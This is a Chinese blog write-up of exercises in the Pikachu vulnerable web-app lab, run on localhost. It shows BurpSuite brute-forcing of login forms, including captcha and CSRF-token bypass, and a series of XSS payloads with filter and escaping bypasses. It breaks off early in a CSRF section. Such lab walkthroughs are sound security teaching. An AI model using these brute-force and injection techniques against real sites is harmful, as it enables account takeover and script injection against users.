<h3 id="BurpSuite-抓本地包的方法"><a href="#BurpSuite-抓本地包的方法" class="headerlink" title="BurpSuite 抓本地包的方法"></a>BurpSuite 抓本地包的方法</h3><p><a href="[关于Burp Suite不能拦截localhost,127.0.0.1的问题_我%@&amp;的博客-CSDN博客_burp无法拦截本地](https://blog.csdn.net/weixin_45396639/article/details/104379312">参考</a>)</p>
<ul>
<li>核心是设置浏览器允许本地（localhost 127.0.0.1）使用代理</li>
</ul>
<h4 id="代理服务器"><a href="#代理服务器" class="headerlink" title="代理服务器"></a>代理服务器</h4><ul>
<li>我这里用 SwitchyOmega 插件来管理代理设置，原先设置的Burpsuite代理，默认是不代理本地主机的</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607114930145.png" alt="image-20210607114930145"></p>
<ul>
<li>需要将不代理地址列表清空</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607115005856.png" alt="image-20210607115005856"></p>
<h4 id="允许劫持localhost"><a href="#允许劫持localhost" class="headerlink" title="允许劫持localhost"></a>允许劫持localhost</h4><ul>
<li><p>火狐浏览器搜索 <code>about:config</code></p>
</li>
<li><p>搜索首选项名称 <code>network.proxy.allow_hijacking_localhost</code></p>
</li>
<li>将 false 改为 true<ul>
<li>注意：当需要Bp获取请求包时，再将 config 改为 true（如点击登录按钮等）</li>
</ul>
</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607122844889.png" alt="image-20210607122844889"></p>
<h2 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1 暴力破解"></a>1 暴力破解</h2><h3 id="1-1-基于表单的暴力破解"><a href="#1-1-基于表单的暴力破解" class="headerlink" title="1.1 基于表单的暴力破解"></a>1.1 基于表单的暴力破解</h3><ul>
<li>打开Bp，先进入登录页，任意输入用户名及口令，更换为本地代理，然后将 network.proxy.allow_hijacking_localhost 改为 true，点击 Login</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607123202666.png" alt="image-20210607123202666" style="zoom:67%;"></p>
<ul>
<li>获取请求，CTRL + I 发送至 Intruder 模块，添加变量，攻击类型改为 Cluster bomb。并分别为用户名密码设置 payload，设置线程（这里设为 50）    </li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607123403675.png" alt="image-20210607123403675"></p>
<ul>
<li>start attack，根据响应包长度找到两个成功登录的用户名及口令，Done！</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607123835691.png" alt="image-20210607123835691"></p>
<h3 id="1-2-验证码绕过-on-server"><a href="#1-2-验证码绕过-on-server" class="headerlink" title="1.2 验证码绕过(on server)"></a>1.2 验证码绕过(on server)</h3><p><img src="/2021/06/07/pikachuRecord/image-20210607144107445.png" alt="image-20210607144107445" style="zoom:67%;"></p>
<ul>
<li>打开 Bp，在输入框中填写任意用户名和口令，然后输入相应的验证码，选择本地代理并将 network.proxy.allow_hijacking_localhost 改为 true，用 Bp 截获请求。CTRL + R 发送到 Repeater，Go，试试验证码</li>
<li>当我们输入页面显示的验证码会提示，用户名或密码不存在</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607144054121.png" alt="image-20210607144054121"></p>
<ul>
<li>任意修改用户名及密码，都会得到这个提示，而修改验证码则会提示</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607144214033.png" alt="image-20210607144214033"></p>
<ul>
<li>因此得到结论：后台并不会刷新验证，我们得到的验证码持续有效，因此 CTRL + I 发送到 Intruder 模块进行爆破。</li>
<li>与上文同理可得两个账号</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607144425800.png" alt="image-20210607144425800"></p>
<h3 id="1-3-验证码绕过-on-client"><a href="#1-3-验证码绕过-on-client" class="headerlink" title="1.3 验证码绕过(on client)"></a>1.3 验证码绕过(on client)</h3><p><img src="/2021/06/07/pikachuRecord/image-20210607150116727.png" alt="image-20210607150116727" style="zoom: 67%;"></p>
<ul>
<li>操作步骤同上一节服务端绕过</li>
<li>与之不同之处，从 Repeater 开始，本次实验即使输错验证码，甚至删除验证码参数都不会提示验证码错误或验证码为空，均提示</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607150404787.png" alt="image-20210607150404787"></p>
<ul>
<li><p>在响应中可以看到，验证码生成与验证是通过前端 JS 实现，只有在前端通过网页登录才会进行验证。用 Bp 直接 POST 参数，是不会进行验证的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> code; <span class="comment">//在全局 定义验证码</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createCode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> codeLength = <span class="number">5</span>;<span class="comment">//验证码的长度</span></span><br><span class="line">        <span class="keyword">var</span> checkCode = <span class="built_in">document</span>.getElementById(<span class="string">&quot;checkCode&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> selectChar = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>);<span class="comment">//所有候选组成验证码的字符，当然也可以用中文的</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; codeLength; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> charIndex = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">36</span>);</span><br><span class="line">            code += selectChar[charIndex];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//alert(code);</span></span><br><span class="line">        <span class="keyword">if</span> (checkCode) &#123;</span><br><span class="line">            checkCode.className = <span class="string">&quot;code&quot;</span>;</span><br><span class="line">            checkCode.value = code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> inputCode = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#bf_client .vcode&#x27;</span>).value;</span><br><span class="line">        <span class="keyword">if</span> (inputCode.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            alert(<span class="string">&quot;请输入验证码！&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inputCode != code) &#123;</span><br><span class="line">            alert(<span class="string">&quot;验证码输入错误！&quot;</span>);</span><br><span class="line">            createCode();<span class="comment">//刷新验证码</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    createCode();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除验证码参数，或使用任意验证码按上一节同样的方式进行爆破即可，Done！</p>
</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607145749921.png" alt="image-20210607145749921" style="zoom:67%;"> </p>
<h3 id="1-4-token防爆破"><a href="#1-4-token防爆破" class="headerlink" title="1.4 token防爆破?"></a>1.4 token防爆破?</h3><h4 id="先验知识"><a href="#先验知识" class="headerlink" title="先验知识"></a>先验知识</h4><ul>
<li><p><a href="https://www.jianshu.com/p/24825a2683e6"><strong>什么是 Token：</strong></a> 第一次登录后，服务器生成一个 Token 并返回给客户端，客户端需要带着这个 Token请求数据</p>
</li>
<li><p>使用相同的 token POST 数据会提示 csrf token error </p>
</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607161120581.png" alt="image-20210607161120581"></p>
<ul>
<li>重新获取一个新的 token （重来一次）</li>
</ul>
<hr>
<p><strong><a href="https://blog.csdn.net/qq_38632151/article/details/102600053">BurpSuite Intruder模块的四种攻击类型</a></strong></p>
<ul>
<li>Sniper：（一个 payload）根据字典中数据，依次对标记的变量进行替换。相当于将标记的 n 个变量当作一整块，每次从字典中拿出 n 个数据依次分给这 n 个变量，直到字典用尽。</li>
<li>Battering Ram: （一个 payload）被标记的 n 个变量的变化是同步的。从字典中取出的一个数据会被同步给到这 n 个变量。</li>
<li>Pitchfork: （多个 payload）交叉替换，比如 n 个变量，会对应有 n 个 payload，每个变量的取值只能从它自己的 payload 中获得，当最少 payload 被遍历完，整个攻击过程就结束。</li>
<li>Cluster bomb: （多个 payload）n 个变量就是O(N^n) 的穷举。</li>
</ul>
<hr>
<h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><ul>
<li>前面的步骤跟上文同理，直到发送到 Intruder</li>
<li>由于 Token 需要从上一次响应中取值，所以攻击类型和线程是需要注意的。攻击类型需为 Pitchfork 交叉替换，线程数只能为 1</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607174112388.png" alt="image-20210607174112388"></p>
<p><img src="/2021/06/07/pikachuRecord/image-20210607174059309.png" alt="image-20210607174059309"></p>
<ul>
<li>因为交叉替换会同步遍历 payload，所以如果标记用户名、口令、token 三个变量，那有可能可登录的账号密码不能被遍历到，所以这里的实验只标记了口令和 token，用户名直接猜测是 admin</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607173823435.png" alt="image-20210607173823435"></p>
<ul>
<li>payload 1 选择口令字典；payload 2 由于需要从上一个响应中获取，所以选择 Recursive grep 通过递归搜索</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607174135371.png" alt="image-20210607174135371"></p>
<ul>
<li>Options 中需要添加数据提取</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607174304560.png" alt="image-20210607174304560"></p>
<ul>
<li>点击 Refetch response，搜索 token 选中后点击 ok</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607174356418.png" alt="image-20210607174356418"></p>
<ul>
<li>start attack, Done!</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607174606081.png" alt="image-20210607174606081"></p>
<h2 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2 XSS"></a>2 XSS</h2><h3 id="先验知识-1"><a href="#先验知识-1" class="headerlink" title="先验知识"></a>先验知识</h3><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>反射型，存储型，DOM 型</p>
<h4 id="如何避免"><a href="#如何避免" class="headerlink" title="如何避免"></a>如何避免</h4><ul>
<li>输入过滤</li>
<li>输出转义</li>
</ul>
<h3 id="2-1-反射型xss-get"><a href="#2-1-反射型xss-get" class="headerlink" title="2.1 反射型xss(get)"></a>2.1 反射型xss(get)</h3><ul>
<li>任意输入，发现 GET 参数 message 在变。也可 F12 查看元素得到这个信息</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607201133554.png" alt="image-20210607201133554" style="zoom: 67%;"></p>
<ul>
<li>由于有长度限制，所以直接在 URL 中进行修改使 message 为 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8081/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert(1)%3C/script%3E&amp;submit=submit#</span><br></pre></td></tr></table></figure>
<ul>
<li>页面弹窗，DONE!</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607201441646.png" alt="image-20210607201441646" style="zoom:67%;"></p>
<h3 id="2-2-反射性xss-post"><a href="#2-2-反射性xss-post" class="headerlink" title="2.2 反射性xss(post)"></a>2.2 反射性xss(post)</h3><ul>
<li><p>需要登录，所以先进行弱口令爆破</p>
</li>
<li><p>易得</p>
</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607202353673.png" alt="image-20210607202353673" style="zoom:67%;"></p>
<ul>
<li><code>admin/123456</code> 登录进去，直接在输入框中输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，即刻弹窗</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607202851131.png" alt="image-20210607202851131" style="zoom:67%;"></p>
<ul>
<li>在 BurpSutie 中修改 POST 请求体的内容再 Foward 道理是一样的。Done!</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607203107776.png" alt="image-20210607203107776" style="zoom:80%;"></p>
<h3 id="2-3-存储型xss"><a href="#2-3-存储型xss" class="headerlink" title="2.3 存储型xss"></a>2.3 存储型xss</h3><p>与反射型 XSS 不同，存储型 XSS 会被存储到服务器，是持久型的。也就是说只要成功注入 XSS，用户每次访问都会有效（XSS）</p>
<p><img src="/2021/06/07/pikachuRecord/image-20210607203307990.png" alt="image-20210607203307990" style="zoom:80%;"></p>
<ul>
<li>在留言框，留言<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 即可</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607203354310.png" alt="image-20210607203354310"></p>
<h3 id="2-4-DOM型xss"><a href="#2-4-DOM型xss" class="headerlink" title="2.4 DOM型xss"></a>2.4 DOM型xss</h3><h4 id="2-4-1-什么是-DOM"><a href="#2-4-1-什么是-DOM" class="headerlink" title="2.4.1 什么是 DOM"></a>2.4.1 什么是 DOM</h4><p><a href="https://www.w3school.com.cn/htmldom/index.asp">参考 HTML DOM</a> </p>
<p>Document Object Model（文档对象模型）将 HTML 文档表达为树结构。它定义了所有 HTML 元素的对象和属性，以及访问它们的方法。通过 HTML DOM，树中的所有节点均可通过 JavaScript 的一些 API 进行访问，所有 HTML 元素均可被修改，也可以创建或删除节点。</p>
<p><a href="https://www.w3school.com.cn/htmldom/dom_methods.asp">HTML DOM 方法 (w3school.com.cn)</a></p>
<h4 id="2-4-2-具体步骤"><a href="#2-4-2-具体步骤" class="headerlink" title="2.4.2 具体步骤"></a>2.4.2 具体步骤</h4><ul>
<li>点击按钮，显示 “what do you see?” 的链接，这个链接指向的就是当前当前页</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607210035764.png" alt="image-20210607210035764" style="zoom:80%;"></p>
<ul>
<li>F12 找到这个元素</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607210703950.png" alt="image-20210607210703950"></p>
<ul>
<li>所以，我们在输入框输入的数据会通过 DOM 方法 <code>getElementById()</code> 获取到并初始化 str，第二个 <code>getElementById(&quot;dom&quot;)</code> 则会找到 dom 元素，并通过 innerHTML 属性获取元素内容。这样的话，我们可以通过对输出值的修改闭合前面的单引号然后注入。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;</span>xss<span class="string">&#x27;)&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>原来的 dom 节点就会被修改为</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607211555195.png" alt="image-20210607211555195"></p>
<ul>
<li>只要鼠标在图片上放移动，就会触发 XSS</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607211922958.png" alt="image-20210607211922958" style="zoom:80%;"></p>
<h4 id="2-4-3-拓展"><a href="#2-4-3-拓展" class="headerlink" title="2.4.3 拓展"></a>2.4.3 拓展</h4><ul>
<li>为了加深理解，我们可以自己闭合标签后，在页面新增输入框等元素</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;&lt;input id=&quot;hh&quot; name=&quot;hh&quot; type=&quot;text&quot; value&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210607212408963.png" alt="image-20210607212408963" style="zoom:80%;"></p>
<ul>
<li>新增按钮</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;&lt;input id=&quot;hh&quot; name=&quot;hh&quot; type=&quot;button&quot; value=&quot;hh&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210607212537663.png" alt="image-20210607212537663" style="zoom:80%;"></p>
<h3 id="2-5-DOM型xss-x"><a href="#2-5-DOM型xss-x" class="headerlink" title="2.5 DOM型xss-x"></a>2.5 DOM型xss-x</h3><ul>
<li>点击按钮后出现一个超链接</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607233707959.png" alt="image-20210607233707959" style="zoom:80%;"></p>
<ul>
<li>点击该链接，发现 dom 节点</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607233836115.png" alt="image-20210607233836115" style="zoom:80%;"></p>
<ul>
<li>再往前看看源码，所以首先会从输入框获取字符串，然后以 “text=” 进行分割后，选第二个元素；再将这个元素中的加号换成空格，然后再送给 <code>getElementById</code> 处理。</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607233913956.png" alt="image-20210607233913956"></p>
<ul>
<li>可以输入字符串后，直接在浏览器控制台跑一下代码，看看其变化</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;</span>xss<span class="string">&#x27;)&quot;&gt;</span></span><br><span class="line"><span class="string">或</span></span><br><span class="line"><span class="string">&#x27;</span> onclick=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210607234252072.png" alt="image-20210607234252072"></p>
<p><img src="/2021/06/07/pikachuRecord/image-20210607234312425.png" alt="image-20210607234312425"></p>
<ul>
<li>所以道理是一样的，只不过受影响的节点是点击按钮后的第二条链接处</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210607234438728.png" alt="image-20210607234438728" style="zoom:80%;"></p>
<ul>
<li>DONE!</li>
</ul>
<h3 id="2-6-xss盲打"><a href="#2-6-xss盲打" class="headerlink" title="2.6 xss盲打"></a>2.6 xss盲打</h3><p>核心就是<strong>尝试</strong></p>
<ul>
<li>提示登录后台 <a href="http://localhost:8081/pikachu/vul/xss/xssblind/admin_login.php">http://localhost:8081/pikachu/vul/xss/xssblind/admin_login.php</a></li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210608234642882.png" alt="image-20210608234642882" style="zoom:80%;"></p>
<p><img src="/2021/06/07/pikachuRecord/image-20210608234739069.png" alt="image-20210608234739069" style="zoom:80%;"></p>
<ul>
<li>弱口令爆破可以得到 admin/123456，进入后台可以看到已有的留言</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210608234837073.png" alt="image-20210608234837073" style="zoom:80%;"></p>
<ul>
<li>尝试在留言框写入</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>管理员重新进入后台时，就会触发 xss</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210608235226651.png" alt="image-20210608235226651"></p>
<hr>
<p>当然姓名框也可以进行 xss</p>
<p><img src="/2021/06/07/pikachuRecord/image-20210608235355873.png" alt="image-20210608235355873"></p>
<hr>
<h3 id="2-7-xss之过滤"><a href="#2-7-xss之过滤" class="headerlink" title="2.7 xss之过滤"></a>2.7 xss之过滤</h3><ul>
<li>大小写绕过</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;Script&gt;alert(<span class="number">1</span>)&lt;/Script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-8-xss之htmlspecialchars"><a href="#2-8-xss之htmlspecialchars" class="headerlink" title="2.8 xss之htmlspecialchars"></a>2.8 xss之htmlspecialchars</h3><h4 id="2-8-1-htmlspecialchars"><a href="#2-8-1-htmlspecialchars" class="headerlink" title="2.8.1 htmlspecialchars"></a>2.8.1 htmlspecialchars</h4><p><a href="https://www.php.net/htmlspecialchars/">PHP: htmlspecialchars - Manual</a></p>
<ul>
<li><code>&amp;</code> (&amp; 符号) <code>&amp;amp;</code></li>
<li><code>&quot;</code> (双引号) <code>&amp;quot;</code>，除非设置了 ENT_NOQUOTES</li>
<li><code>&#39;</code> (单引号) 设置了 ENT_QUOTES 后进行转换：<ul>
<li><code>#039;</code> (如果是 ENT_HTML401) ，或者</li>
<li><code>&amp;apos;</code> (如果是 ENT_XML1、 ENT_XHTML 或 ENT_HTML5)。</li>
</ul>
</li>
<li><code>&lt;</code> (小于)成为 <code>&amp;lt;</code></li>
<li><code>&gt;</code> (大于)成为 <code>&amp;gt;</code></li>
</ul>
<h4 id="2-8-2-具体步骤"><a href="#2-8-2-具体步骤" class="headerlink" title="2.8.2 具体步骤"></a>2.8.2 具体步骤</h4><p><img src="/2021/06/07/pikachuRecord/image-20210609222240442.png" alt="image-20210609222240442" style="zoom: 80%;"></p>
<ul>
<li>输入测试代码 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 后，查看源码，发现 <code>&lt;&gt;</code> 被替换掉了</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&#x27;notice&#x27;</span>&gt;</span>你的输入已经被记录:<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>&#x27;</span>&gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>输入单引号进行测试</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">p class=&#x27;notice&#x27;&gt;你的输入已经被记录:<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;&#x27;</span>&#x27;&gt;</span>&#x27;<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>所以可以通过只是用单引号的方法注入，成功</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span>alert(<span class="number">1</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="string">&#x27;</span> onmouseover=<span class="string">&#x27;alert(1)&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210609223539074.png" alt="image-20210609223539074" style="zoom:80%;"></p>
<p><img src="/2021/06/07/pikachuRecord/image-20210609223629192.png" alt="image-20210609223629192" style="zoom:80%;"></p>
<ul>
<li>查看源码，这段代码是完成注入的</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210609223735459.png" alt="image-20210609223735459"></p>
<h3 id="2-9-xss之href输出"><a href="#2-9-xss之href输出" class="headerlink" title="2.9 xss之href输出"></a>2.9 xss之href输出</h3><ul>
<li>输入测试</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&amp;<span class="string">&quot;&#x27;&lt;&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>查看网页源码</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;<span class="symbol">&amp;amp;</span><span class="symbol">&amp;quot;</span><span class="symbol">&amp;#039;</span><span class="symbol">&amp;lt;</span><span class="symbol">&amp;gt;</span>&#x27;</span>&gt;</span> 阁下自己输入的url还请自己点一下吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>都被转换过了，所以尝试 JavaScript 伪协议 <a href="https://www.cnblogs.com/mingqi-420/p/11022505.html">参考</a></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">javascript:alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>查看一下源码，成功注入</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210609230835988.png" alt="image-20210609230835988" style="zoom:80%;"></p>
<ul>
<li>点击链接，即可触发 XSS</li>
</ul>
<p><img src="/2021/06/07/pikachuRecord/image-20210609230740761.png" alt="image-20210609230740761" style="zoom:80%;"></p>
<h3 id="2-10-xss之js输出"><a href="#2-10-xss之js输出" class="headerlink" title="2.10 xss之js输出"></a>2.10 xss之js输出</h3><ul>
<li>随便输入个 123 查看源码</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $ms=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>($ms.length != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>($ms == <span class="string">&#x27;tmac&#x27;</span>)&#123;</span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).text(<span class="string">&#x27;tmac确实厉害,看那小眼神..&#x27;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            alert($ms);</span></span><br><span class="line">            $(<span class="string">&#x27;#fromjs&#x27;</span>).text(<span class="string">&#x27;无论如何不要放弃心中所爱..&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>发现输入会直接插入到 JavaScript 中，所以 <code>&#39;&lt;/script&gt;</code> 闭合前面的 <code>&lt;script&gt;</code>，然后就可以写入 XSS 了</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/07/pikachuRecord/image-20210609234552759.png" alt="image-20210609234552759" style="zoom:80%;"></p>
<h2 id="3-CSRF"><a href="#3-CSRF" class="headerlink" title="3 CSRF"></a>3 CSRF</h2><h3 id="先验知识-2"><a href="#先验知识-2" class="headerlink" title="先验知识"></a>先验知识</h3><p><a href="https://www.cnblogs.com/chenyablog/p/12108261.html">XSS与CSRF的区别 - 抖音2020 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅谈CSRF攻击方式 - hyddd - 博客园 (cnblogs.com)</a></p>
<ul>
<li>CSRF（跨站请求伪造）与 XSS 的区别：<ul>
<li>CSRF 需要用户先登录网站A，获取 cookie。XSS 不需要登录</li>
<li>CSRF 是利用网站A本身的漏洞，去请求网站A的api。XSS 是向网站 A 注入 JS代码，然后执行 JS 里的代码，篡改网站A的内容。</li>
</ul>
</li>
</ul>
<p>总的来说就是：<strong>攻击者盗用用户的身份，假装用户发起恶意请求</strong></p>
<h3 id="3-1-CSRF-get-login"><a href="#3-1-CSRF-get-login" class="headerlink" title="3.1 CSRF(get) login"></a>3.1 CSRF(get) login</h3><ul>
<li>输入 lili/123456 点击登录并截获请求</li>
</ul>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/pikachu/vul/csrf/csrfget/csrf_get_login.php?username=lili&amp;password=123456&amp;submit=Login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span 